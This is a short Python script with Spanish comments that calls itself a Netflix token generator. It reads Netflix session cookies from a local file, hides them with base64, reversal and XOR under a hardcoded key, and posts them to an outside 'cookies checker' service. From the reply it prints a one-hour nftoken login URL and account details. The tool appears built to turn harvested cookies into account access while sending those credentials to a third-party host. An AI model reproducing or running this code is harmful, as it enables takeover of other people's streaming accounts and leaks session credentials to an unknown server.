"""
Netflix Token Generator - Version simplificada
Genera un token nftoken a partir de tus cookies.
"""
import os, base64, json, requests, time, random, string

API_URL = "https://netflixcookieschecker.onrender.com/api/check"
API_SECRET_KEY = "Send You Mom Tonight"
COOKIES_FILE = "netflix_cookies.txt"

def load_cookies():
    cookies = {}
    with open(COOKIES_FILE, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if line.startswith('#HttpOnly_'):
                line = line[10:]
            if '.netflix.com' in line:
                parts = line.split('\t')
                if len(parts) >= 7:
                    cookies[parts[5].strip()] = parts[6].strip()
            elif '=' in line and not line.startswith('.'):
                n, v = line.split('=', 1)
                cookies[n.strip()] = v.strip()
    return cookies

def encrypt(data):
    data['timestamp'] = int(time.time())
    b64 = base64.b64encode(json.dumps(data).encode()).decode()
    rev = b64[::-1]
    xored = ''.join(chr(ord(c) ^ ord(API_SECRET_KEY[i % len(API_SECRET_KEY)])) for i, c in enumerate(rev))
    final = base64.b64encode(
        (''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ':' + base64.b64encode(xored.encode()).decode()).encode()
    ).decode()
    return final

def decrypt(data):
    try:
        _, l4 = base64.b64decode(data).decode().split(':', 1)
        l3 = base64.b64decode(l4).decode('latin-1')
        l2 = ''.join(chr(ord(c) ^ ord(API_SECRET_KEY[i % len(API_SECRET_KEY)])) for i, c in enumerate(l3))
        return json.loads(base64.b64decode(l2[::-1]).decode())
    except:
        return None

def main():
    cookies = load_cookies()
    if not cookies:
        print("[ERROR] No se pudieron cargar cookies de netflix_cookies.txt")
        return

    print(f"Cookies cargadas: {len(cookies)}")
    for k in cookies:
        print(f"  - {k}: {cookies[k][:40]}...")

    # Armar payload
    ctxt = "# Netscape HTTP Cookie File\n"
    for name, value in cookies.items():
        ctxt += f".netflix.com\tTRUE\t/\tTRUE\t9999999999\t{name}\t{value}\n"

    encrypted = encrypt({"content": ctxt, "mode": "tokenonly"})
    if not encrypted:
        print("[ERROR] Fallo al encriptar payload")
        return

    print(f"\nEnviando a la API...")
    try:
        resp = requests.post(API_URL, json={"encrypted_payload": encrypted}, timeout=30)
        print(f"Status: {resp.status_code}")
        result = resp.json()

        if "encrypted_response" in result:
            dec = decrypt(result["encrypted_response"])
            if dec and "token_result" in dec:
                token = dec["token_result"].get("token", "")
                info = dec.get("account_info", {})

                print("\n" + "="*60)
                print("TOKEN GENERADO CON EXITO")
                print("="*60)
                print(f"\nToken: {token}")
                url = f"https://netflix.com/account?nftoken={token}"
                print(f"URL:  {url}")
                print(f"\nValido por ~59 minutos")

                if info:
                    print(f"\n--- Info de cuenta ---")
                    for k, v in info.items():
                        print(f"  {k}: {v}")

                # Guardar
                with open("NETFLIX_TOKEN.txt", "w") as f:
                    f.write(token)
                with open("NETFLIX_URL.txt", "w") as f:
                    f.write(url)
                print(f"\nGuardado en NETFLIX_TOKEN.txt y NETFLIX_URL.txt")
            else:
                print(f"[ERROR] No se pudo desencriptar la respuesta")
                print(f"Respuesta cruda: {result}")
        else:
            print(f"[ERROR] Respuesta inesperada: {result}")
    except requests.exceptions.ConnectionError:
        print("[ERROR] No se puede conectar a la API (https://netflixcookieschecker.onrender.com)")
        print("       El servicio puede estar caido o no disponible.")
    except Exception as e:
        print(f"[ERROR] {e}")

if __name__ == "__main__":
    main()
